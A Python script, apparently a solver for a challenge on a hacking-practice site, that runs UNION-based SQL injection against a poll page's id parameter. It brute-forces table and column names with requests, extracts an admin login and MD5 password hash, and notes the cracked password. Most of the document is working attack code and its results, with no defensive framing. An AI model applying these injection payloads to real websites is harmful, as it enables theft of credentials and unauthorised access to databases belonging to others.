import requests

url = "http://hacking.newbiecontest.org:10800/ep16/sondage/poll.php?id="

# query = "SELECT question,rep1,rep2,rep3,rep4,n1,n2,n3,n4 FROM sondage WHERE id=" + getparam

inj = "1 UNION SELECT login,pass,1,1,1,1,1,1,1 FROM {0}"

"""
tablesToTry = ["admin" , "admins", "user", "users", "root", "info", "pass", "password", "passwords"]

for table in tablesToTry:
    r = requests.get(url + inj.format(table))
    print(table + ": " + r.text)
    
table = admin    
"""

"""
fieldNamesToTry = ["pass", "pwd", "passw", "password", "passwd", "pw"]
inj = "1 UNION SELECT login,{0},1,1,1,1,1,1,1 FROM admin"
for fieldname in fieldNamesToTry:
    r = requests.get(url + inj.format(fieldname))
    print(fieldname + ": " + r.text)
   

field name = pass

note: always the first name that comes to mind AFTER I try a few ones by hand and decide to automate the next attempts...
"""

"""
login: nms
pass: 62a0546b6803d82fbdf678cf474454cf ("realiste")

data = {"cmd": "vote", "vote": "3"}
r = requests.post(url+"0 UNION SELECT login,pass,1,1,1,1,1,1,1 FROM admin", data=data)

# r = requests.get(url+"0 UNION SELECT login,pass,1,1,1,1,1,1,1 FROM admin WHERE SUBSTRING(login,1,1)=CHAR(97)")

print(r.text)
"""

url = "http://hacking.newbiecontest.org:10800/ep16/"
names = ["admin", "root", "control", "membre", "members"]
